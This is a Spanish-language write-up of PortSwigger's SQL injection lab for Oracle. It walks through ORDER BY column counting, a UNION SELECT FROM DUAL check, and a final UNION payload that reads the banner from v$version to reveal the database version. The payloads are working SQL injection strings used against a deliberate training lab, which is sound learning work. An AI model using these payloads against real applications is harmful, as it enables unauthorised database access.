# Write-up - PortSwigger SQLi Lab 6

Voy a hacer un laboratorio de Port Swigger. El lab 6 de SQLi (En esta url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) Descripción: Tradúcela al Español:

Lab: SQL injection attack, querying the database type and version on Oracle.

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de productos. Puedes usar un ataque UNION para recuperar los resultados de una consulta inyectada.

Para resolver el laboratorio, muestra la cadena de versión de la base de datos.

Por tanto nuestro Objetivo Principal es:
Obtener tipo y versión de la BBDD Oracle

Le damos a abrir lab y nos abre una página con la url:
https://0a790059039a42f682f9c596003f00d8.web-security-academy.net/

La página web tiene el aspecto de la imagen 1.

![Imagen 1](imagenes/imagen1.png)

Referencia imagen 1: vista inicial.

Una vez dentro, abrimos burpsuitepro y activamos FoxyProxy.

Nos vamos a Gifts:
https://0a790059039a42f682f9c596003f00d8.web-security-academy.net/filter?category=Gifts

Request:

GET /filter?category=Gifts HTTP/2
Host: 0a790059039a42f682f9c596003f00d8.web-security-academy.net

Proceso:

' ORDER BY 1-- → 200
' ORDER BY 2-- → 200
' ORDER BY 3-- → 500

2 columnas.

Verificamos texto:

' UNION SELECT 'a','a' FROM DUAL-- → 200

Oracle necesita FROM DUAL.

Payload final:

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

Resultado (imagen 2):

![Imagen 2](imagenes/imagen2.png)

Referencia imagen 2: versión Oracle.

NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0
PL/SQL Release 11.2.0.2.0
TNS for Linux Version 11.2.0.2.0

Lab resuelto

